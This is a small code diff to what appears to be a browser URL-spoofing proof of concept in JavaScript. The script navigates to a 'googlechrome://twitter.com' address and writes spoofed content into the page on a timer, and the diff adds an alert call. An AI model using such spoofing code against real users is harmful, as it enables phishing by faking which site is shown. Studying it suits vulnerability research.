@@ -4,6 +4,7 @@
 	        v = setInterval(`x=document.location='googlechrome://twitter.com:1234'`);
 	        i = setInterval(`
 	            x.document.write("<h1>url spoofing...</h1>");
+                    x.alert('');
 	            clearInterval(v);
 	            clearInterval(i);
 	            `, 3333);
